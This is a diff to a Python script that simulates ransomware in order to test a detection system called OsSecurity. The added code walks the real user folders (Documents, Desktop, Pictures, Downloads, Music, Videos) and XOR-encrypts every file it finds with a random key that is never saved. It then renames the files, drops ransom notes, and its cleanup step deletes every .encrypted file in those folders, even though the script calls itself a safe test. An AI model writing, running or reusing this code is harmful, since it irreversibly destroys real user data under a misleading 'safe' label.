@@ -5,8 +5,12 @@ Fake Ransomware — Safe test script for OsSecurity detection system.
 Creates realistic files in user directories, then encrypts them
 with high I/O to trigger the ransomware detection pipeline.
 
+Walks the REAL user directories (Desktop, Documents, Pictures)
+just like real ransomware would — so it naturally encounters
+honeypot decoy files placed there by the detection system.
+
 Usage:
-  Terminal 1: sudo python3 main.py          # Detection system
+  Terminal 1: sudo python3 main.py                # Detection system
   Terminal 2: python3 fake_ransomware.py create    # Set up fake files
   Terminal 3: python3 fake_ransomware.py encrypt   # Start "attack"
   Terminal 3: python3 fake_ransomware.py cleanup   # Remove all test files
@@ -17,18 +21,23 @@ Requires: Linux (uses /proc for I/O stats)
 import os
 import sys
 import time
-
 import argparse
 from pathlib import Path
 
 VICTIM_ROOT = Path("/tmp/fake_ransomware_victims")
 
-# Directories ransomware typically targets
-TARGET_DIRS = [
-    Path.home() / "Documents" / "test_victims",
-    Path.home() / "Desktop" / "test_victims",
-    Path.home() / "Pictures" / "test_victims",
+# Directories ransomware typically targets — same dirs the honeypot plants decoys in
+SCAN_DIRS = [
+    Path.home() / "Documents",
+    Path.home() / "Desktop",
+    Path.home() / "Pictures",
+    Path.home() / "Downloads",
+    Path.home() / "Music",
+    Path.home() / "Videos",
 ]
+
+# Subdirectory where we create test victim files (so cleanup is easy)
+VICTIM_SUBDIR = "test_victims"
 
 # File types ransomware cares about
 FILE_EXTENSIONS = [
@@ -41,31 +50,25 @@ def create_victim_files() -> list[Path]:
     """Create realistic file structures in user directories."""
     all_files = []
 
-    for target_dir in TARGET_DIRS:
-        target_dir.mkdir(parents=True, exist_ok=True)
+    for scan_dir in SCAN_DIRS:
+        victim_dir = scan_dir / VICTIM_SUBDIR
+        victim_dir.mkdir(parents=True, exist_ok=True)
 
-        # Create sub-directories like a real user would have
         subdirs = ["work", "personal", "projects", "finances"]
         for subdir_name in subdirs:
-            subdir = target_dir / subdir_name
+            subdir = victim_dir / subdir_name
             subdir.mkdir(exist_ok=True)
 
-            # Create files in each subdirectory
             for i in range(8):
                 ext = FILE_EXTENSIONS[(i + hash(subdir_name)) % len(FILE_EXTENSIONS)]
                 file_path = subdir / f"document_{i:03d}{ext}"
                 if ext == ".jpg":
-                    # Fake image — random bytes that look like binary
-                    file_path.write_bytes(os.urandom(50 * 1024))  # 50KB
+                    file_path.write_bytes(os.urandom(50 * 1024))
                 elif ext == ".pdf":
-                    # Fake PDF header + random content
-                    content = b"%PDF-1.4\n" + os.urandom(100 * 1024)  # 100KB
-                    file_path.write_bytes(content)
+                    file_path.write_bytes(b"%PDF-1.4\n" + os.urandom(100 * 1024))
                 elif ext in (".xlsx", ".docx"):
-                    # Fake office document — larger to look real
-                    file_path.write_bytes(os.urandom(80 * 1024))  # 80KB
+                    file_path.write_bytes(os.urandom(80 * 1024))
                 else:
-                    # Text-based files
                     content = f"Important Document #{i}\n"
                     content += "=" * 50 + "\n"
                     content += f"Category: {subdir_name}\n"
@@ -76,25 +79,20 @@ def create_victim_files() -> list[Path]:
 
                 all_files.append(file_path)
 
-        # Also put some files directly in the target dir
         for i in range(5):
             ext = FILE_EXTENSIONS[i % len(FILE_EXTENSIONS)]
-            file_path = target_dir / f"important_{i:03d}{ext}"
+            file_path = victim_dir / f"important_{i:03d}{ext}"
             file_path.write_text(f"Top-level document {i}\n" + "A" * 500 + "\n")
             all_files.append(file_path)
 
-    # Also create files in the shared victim root for good measure
     VICTIM_ROOT.mkdir(parents=True, exist_ok=True)
     for i in range(20):
         ext = FILE_EXTENSIONS[i % len(FILE_EXTENSIONS)]
         file_path = VICTIM_ROOT / f"file_{i:03d}{ext}"
-        file_path.write_bytes(os.urandom(100 * 1024))  # 100KB each
+        file_path.write_bytes(os.urandom(100 * 1024))
         all_files.append(file_path)
 
-    print(f"[CREATE] Created {len(all_files)} files across {len(TARGET_DIRS)} directories + {VICTIM_ROOT}")
-    for d in TARGET_DIRS:
-        count = sum(1 for _ in d.rglob("*") if _.is_file())
-        print(f"  {d}: {count} files")
+    print(f"[CREATE] Created {len(all_files)} files")
     return all_files
 
 
@@ -104,33 +102,68 @@ def xor_encrypt(data: bytes, key: bytes) -> bytes:
     return bytes(a ^ b for a, b in zip(data, key_stream))
 
 
+def _collect_target_files() -> list[Path]:
+    """
+    Walk all real user directories — same behavior as real ransomware.
+    This naturally finds honeypot files (.HONEYPOT_*) because we walk
+    the same directories the honeypot plants them in.
+    """
+    all_files = []
+
+    # Walk the real user directories (Desktop, Documents, Pictures, etc.)
+    for scan_dir in SCAN_DIRS:
+        if not scan_dir.is_dir():
+            continue
+        for f in scan_dir.rglob("*"):
+            if not f.is_file():
+                continue
+            # Skip already-encrypted files
+            if f.name.endswith(".encrypted"):
+                continue
+            # Skip our own ransom notes
+            if f.name == "README_DECRYPT_YOUR_FILES.txt":
+                continue
+            all_files.append(f)
+
+    # Walk /tmp victims too
+    if VICTIM_ROOT.is_dir():
+        for f in VICTIM_ROOT.rglob("*"):
+            if f.is_file() and not f.name.endswith(".encrypted"):
+                all_files.append(f)
+
+    return all_files
+
+
 def encrypt_files(duration_sec: float = 30.0) -> None:
     """
     Walk user directories and encrypt files — mimics real ransomware.
 
-    This should trigger:
+    Key behavior: walks ~/Desktop, ~/Documents, ~/Pictures, etc.
+    recursively — just like real ransomware. This means it WILL
+    encounter and encrypt the honeypot decoy files, which triggers
+    the detection system to confirm ransomware and kill this process.
+
+    Should trigger:
     1. Monitor: high write_bytes above 50 MB/s
-    2. Detector: SUSPICIOUS after 5s sustained
-    3. Honeypot: decoy files get encrypted → RANSOMWARE CONFIRMED
-    4. Detector: process killed
+    2. Detector: SUSPICIOUS after sustained high I/O
+    3. Honeypot: decoy files in user dirs get encrypted → CONFIRMED
+    4. Detector: SIGKILL
     """
     print(f"\n[ATTACK] Starting encryption attack for up to {duration_sec}s...")
     print(f"[ATTACK] PID: {os.getpid()} (watch for this in the detector logs)")
     print()
 
-    # Collect all target files
-    all_files: list[Path] = []
-    for target_dir in TARGET_DIRS:
-        if target_dir.exists():
-            all_files.extend(f for f in target_dir.rglob("*") if f.is_file() and not f.name.endswith(".encrypted"))
-    if VICTIM_ROOT.exists():
-        all_files.extend(f for f in VICTIM_ROOT.rglob("*") if f.is_file() and not f.name.endswith(".encrypted"))
+    all_files = _collect_target_files()
 
     if not all_files:
         print("[ERROR] No files found. Run 'create' first.")
         return
 
     print(f"[ATTACK] Found {len(all_files)} files to encrypt")
+    for d in SCAN_DIRS:
+        if d.is_dir():
+            count = sum(1 for _ in d.rglob("*") if _.is_file() and not _.name.endswith(".encrypted"))
+            print(f"  {d}: {count} files")
 
     start_time = time.time()
     bytes_written = 0
@@ -138,69 +171,50 @@ def encrypt_files(duration_sec: float = 30.0) -> None:
     key = os.urandom(32)
 
     # Write a ransom note (classic ransomware behavior)
-    for target_dir in TARGET_DIRS:
-        if target_dir.exists():
-            note = target_dir / "README_DECRYPT_YOUR_FILES.txt"
-            note.write_text(
-                "ATTENTION: Your files have been encrypted!\n"
-                "Send 1 BTC to recover your data.\n"
-                "[This is a SAFE TEST — OsSecurity detection test]\n"
-            )
+    for scan_dir in SCAN_DIRS:
+        if scan_dir.is_dir():
+            try:
+                note = scan_dir / "README_DECRYPT_YOUR_FILES.txt"
+                note.write_text(
+                    "ATTENTION: Your files have been encrypted!\n"
+                    "Send 1 BTC to recover your data.\n"
+                    "[This is a SAFE TEST — OsSecurity detection test]\n"
+                )
+            except (PermissionError, OSError):
+                pass
 
-    # Encrypt files in a loop — keep writing to maintain high I/O
     end_time = start_time + duration_sec
     file_idx = 0
 
     while time.time() < end_time:
-        if not all_files:
-            # Re-scan for any unencrypted files
-            all_files = []
-            for target_dir in TARGET_DIRS:
-                if target_dir.exists():
-                    all_files.extend(f for f in target_dir.rglob("*") if f.is_file() and not f.name.endswith(".encrypted"))
+        # Refresh file list periodically (honeypot may add new files)
+        if file_idx % 30 == 0:
+            all_files = _collect_target_files()
 
         if not all_files:
-            print("[ATTACK] All files encrypted — rewriting to maintain I/O")
-            # Re-encrypt already-encrypted files to keep I/O high
-            all_files = []
-            for target_dir in TARGET_DIRS:
-                if target_dir.exists():
-                    all_files.extend(f for f in target_dir.rglob("*.encrypted") if f.is_file())
+            print("[ATTACK] No more files to encrypt. Stopping.")
+            break
 
-            if not all_files:
-                print("[ATTACK] No files to work with. Stopping.")
-                break
+        target = all_files[file_idx % len(all_files)]
 
-            # Overwrite encrypted files with new random data (sustained I/O)
-            target = all_files[file_idx % len(all_files)]
-            try:
-                target.write_bytes(os.urandom(200 * 1024))  # 200KB per write
-                bytes_written += 200 * 1024
-            except (PermissionError, OSError):
-                pass
-            file_idx += 1
-        else:
-            target = all_files[file_idx % len(all_files)]
+        try:
+            original = target.read_bytes()
+            encrypted = xor_encrypt(original, key)
 
-            try:
-                original = target.read_bytes()
-                encrypted = xor_encrypt(original, key)
+            # Write encrypted content back
+            target.write_bytes(encrypted)
 
-                # Write encrypted content back
-                target.write_bytes(encrypted)
+            # Rename to .encrypted (like real ransomware)
+            encrypted_path = target.with_suffix(target.suffix + ".encrypted")
+            target.rename(encrypted_path)
 
-                # Rename to .encrypted (like real ransomware)
-                encrypted_path = target.with_suffix(target.suffix + ".encrypted")
-                target.rename(encrypted_path)
+            bytes_written += len(encrypted)
+            encrypted_count += 1
 
-                bytes_written += len(encrypted)
-                encrypted_count += 1
+        except (PermissionError, OSError):
+            pass
 
-            except (PermissionError, OSError) as e:
-                # Can't access this file — skip (dotfiles, system files etc.)
-                pass
-
-            file_idx += 1
+        file_idx += 1
 
         # Print progress every 20 files
         if file_idx % 20 == 0:
@@ -212,18 +226,21 @@ def encrypt_files(duration_sec: float = 30.0) -> None:
                       f"{mbps:.1f} MB/s | "
                       f"{elapsed:.0f}s elapsed")
 
-        # Small batch write to spike I/O — write extra random data
-        if file_idx % 5 == 0:
+        # Burst write to spike I/O above 50 MB/s
+        if file_idx % 3 == 0:
             burst_file = VICTIM_ROOT / f"burst_{file_idx}.tmp"
             try:
-                burst_file.write_bytes(os.urandom(1024 * 1024))  # 1MB burst
-                bytes_written += 1024 * 1024
+                burst_file.write_bytes(os.urandom(2 * 1024 * 1024))  # 2MB burst
+                bytes_written += 2 * 1024 * 1024
                 burst_file.unlink(missing_ok=True)
             except OSError:
                 pass
 
     actual_duration = time.time() - start_time
-    mbps = (bytes_written / (1024 * 1024)) / actual_duration if actual_duration > 0 else 0
+    if actual_duration > 0:
+        mbps = (bytes_written / (1024 * 1024)) / actual_duration
+    else:
+        mbps = 0
 
     print(f"\n[DONE] Encryption stopped after {actual_duration:.1f}s")
     print(f"[DONE] {encrypted_count} files encrypted, {bytes_written / (1024*1024):.1f} MB written")
@@ -235,32 +252,50 @@ def encrypt_files(duration_sec: float = 30.0) -> None:
 
 
 def cleanup_files() -> None:
-    """Remove all test files and encrypted artifacts."""
+    """Remove all test victim files and encrypted artifacts."""
     print("[CLEANUP] Removing test files...")
 
-    for target_dir in TARGET_DIRS:
-        if target_dir.exists():
-            # Remove files (including .encrypted variants)
-            for f in target_dir.rglob("*"):
-                if f.is_file():
-                    try:
-                        f.unlink()
-                    except OSError:
-                        pass
-            # Remove subdirectories
-            for d in sorted(target_dir.rglob("*"), reverse=True):
-                if d.is_dir():
-                    try:
-                        d.rmdir()
-                    except OSError:
-                        pass
-            # Remove the target_dir itself
+    # Remove our test_victims subdirectories
+    for scan_dir in SCAN_DIRS:
+        victim_dir = scan_dir / VICTIM_SUBDIR
+        if not victim_dir.exists():
+            continue
+        for f in victim_dir.rglob("*"):
+            if f.is_file():
+                try:
+                    f.unlink()
+                except OSError:
+                    pass
+        for d in sorted(victim_dir.rglob("*"), reverse=True):
+            if d.is_dir():
+                try:
+                    d.rmdir()
+                except OSError:
+                    pass
+        try:
+            victim_dir.rmdir()
+        except OSError:
+            pass
+        print(f"  Cleaned: {victim_dir}")
+
+    # Remove any .encrypted files left in user directories (from interrupted attacks)
+    for scan_dir in SCAN_DIRS:
+        if not scan_dir.is_dir():
+            continue
+        for f in scan_dir.rglob("*.encrypted"):
             try:
-                target_dir.rmdir()
+                f.unlink()
             except OSError:
                 pass
-            print(f"  Cleaned: {target_dir}")
+        # Remove ransom notes
+        note = scan_dir / "README_DECRYPT_YOUR_FILES.txt"
+        if note.exists():
+            try:
+                note.unlink()
+            except OSError:
+                pass
 
+    # Remove /tmp victims
     if VICTIM_ROOT.exists():
         for f in VICTIM_ROOT.rglob("*"):
             if f.is_file():
